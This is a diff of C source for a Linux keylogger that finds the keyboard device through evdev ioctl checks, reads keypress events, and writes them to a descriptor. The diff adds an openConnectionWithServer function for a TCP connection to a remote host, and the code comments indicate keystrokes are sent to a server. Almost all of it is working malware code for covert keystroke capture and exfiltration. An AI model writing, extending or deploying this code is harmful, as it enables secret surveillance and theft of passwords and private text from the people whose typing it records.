@@ -1,3 +1,5 @@
+/* Developed by Fabio Cinicolo */
+
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
@@ -6,11 +8,13 @@
 #include <string.h>
 #include <errno.h>
 #include <signal.h>
+#include <netdb.h>
 #include <stdint.h>
 #include <linux/input.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <sys/stat.h>
 #include <dirent.h>
-#include "network-ipc.h"
 #include "keylogger.h"
 
 int STOP_KEYLOGGER = 0;
@@ -30,6 +34,8 @@ void startKeylogger(int keyboard, int fd)
 
     kbd_events = malloc(sizeof(event) * MAX_EVENTS);
 
+    syslog(LOG_INFO, "Keylogging started..");
+
     while (!STOP_KEYLOGGER) // If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging
     {
         to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
@@ -43,7 +49,7 @@ void startKeylogger(int keyboard, int fd)
                 if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) // If a key has been pressed..
                     kbd_events[j++] = kbd_events[i];                                    // Add the event to the beginning of the array
             }
-            if (writeEventsIntoFile(fd, kbd_events, j * event_size) < 0) //
+            if (writeEventsIntoFile(fd, kbd_events, j * event_size) < 0)
                 goto end;
         }
     }
@@ -62,7 +68,7 @@ void sigHandler(int signum)
 
 int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
 {
-    size_t written;
+    ssize_t written;
     do
     {
         written = write(fd, events, to_write);
@@ -110,7 +116,7 @@ int findKeyboardDevice(char *dir_path)
             if (S_ISCHR(file_info.st_mode)) // .. if it is a character device ..
             {
                 int keyboard_fd;
-                if ((keyboard_fd = keyboardDevice(file_path)) != -1) // .. and it is a keyboard device, we return its file descriptor
+                if (isKeyboardDevice(file_path, &keyboard_fd)) // .. and it is a keyboard device, we return its file descriptor
                 {
                     free(file_path);
                     return keyboard_fd;
@@ -137,7 +143,7 @@ int findKeyboardDevice(char *dir_path)
     return -1;
 }
 
-int keyboardDevice(char *path)
+int isKeyboardDevice(char *path, int *keyboard_device)
 {
     int32_t events_bitmask = 0;
     int32_t keys_bitmask = 0;
@@ -149,18 +155,43 @@ int keyboardDevice(char *path)
     if (fd < 0)
         syslog(LOG_ERR, "Couldn't open %s: %s", path, strerror(errno));
 
-    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) < 0)
-        syslog(LOG_ERR, "(ioctl) Couldn't obtain events supported by device %s: %s", path, strerror(errno));
-    else
+    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0) // Getting bit events supported by device
     {
         if ((events_bitmask & EV_KEY) == EV_KEY) // If EV_KEY bit is set then it could be a Keyboard, but it can be a false positive (for example, power button has this bit set but it is not a kbd)
         {
-            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) < 0)
-                syslog(LOG_ERR, "(ioctl) Couldn't obtain keys supported by device %s: %s", path, strerror(errno));
-            else if ((keys & keys_bitmask) == keys) // If it support those keys then good chances are that we just found the keyboard device
-                return fd;
+            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0)
+                if ((keys & keys_bitmask) == keys) // If it support those keys then good chances are that we just found the keyboard device
+                {
+                    *keyboard_device = fd;
+                    return 1;
+                }
         }
     }
     close(fd);
-    return -1;
+    return 0;
+}
+
+int openConnectionWithServer(char *ip, short port)
+{
+    int sock_fd;
+    struct hostent *host_info;
+    struct sockaddr_in server;
+
+    if ((host_info = gethostbyname(ip)) == NULL) // Translating hostname into Ip address
+        return -1;
+
+    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); // Opening Tcp socket
+    if (sock_fd < 0)
+        return -1;
+
+    bzero(&server, sizeof(server));
+
+    server.sin_family = AF_INET;
+    server.sin_addr = *((struct in_addr *)host_info->h_addr);
+    server.sin_port = htons(port);
+
+    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) // Connecting to server
+        return -1;
+
+    return sock_fd;
 }
